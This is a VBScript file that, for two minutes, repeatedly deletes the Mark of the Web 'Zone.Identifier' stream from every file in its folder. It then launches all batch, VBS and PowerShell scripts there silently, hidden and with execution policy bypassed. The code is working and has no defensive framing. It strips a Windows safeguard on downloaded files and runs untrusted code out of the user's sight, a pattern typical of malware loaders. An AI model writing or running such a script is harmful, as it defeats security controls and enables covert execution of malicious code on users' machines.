Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get paths strictly relative to where this separate script is located
scriptPath = WScript.ScriptFullName
scriptName = objFSO.GetFileName(scriptPath)
currentDir = objFSO.GetParentFolderName(scriptPath)

' 1. Switch strictly to this script's own folder context
objShell.CurrentDirectory = currentDir

' 2. Timer Setup: Loop for 2 minutes (120 seconds) total
endTime = DateAdd("s", 120, Now)

Do While Now < endTime
    If objFSO.FolderExists(currentDir) Then
        Set folder = objFSO.GetFolder(currentDir)
        Set files = folder.Files
        
        For Each file in files
            fileName = file.Name
            fileExt = LCase(objFSO.GetExtensionName(fileName))
            
            ' Do not affect itself
            If LCase(fileName) <> LCase(scriptName) Then
                
                ' 3. Automated Unblocking: Remove Windows "Mark of the Web" security stream
                zoneStream = file.Path & ":Zone.Identifier"
                If objFSO.FileExists(zoneStream) Then
                    On Error Resume Next
                    objFSO.DeleteFile zoneStream, True
                    On Error GoTo 0
                End If
                
                ' 4. Silent Execution: Run matching scripts error-free in the background
                On Error Resume Next
                Select Case fileExt
                    Case "bat", "cmd"
                        ' Run batch files completely hidden (Window style 0)
                        objShell.Run """" & file.Path & """", 0, False
                        
                    Case "vbs"
                        ' Run other VBS files silently via wscript
                        objShell.Run "wscript.exe """ & file.Path & """", 0, False
                        
                    Case "ps1"
                        ' Run PowerShell scripts hidden without popping up windows
                        objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & file.Path & """", 0, False
                End Select
                On Error GoTo 0
            End If
        Next
    End If
    
    ' 5. Interval: Wait half a second (500 milliseconds) before looping again
    WScript.Sleep 500
Loop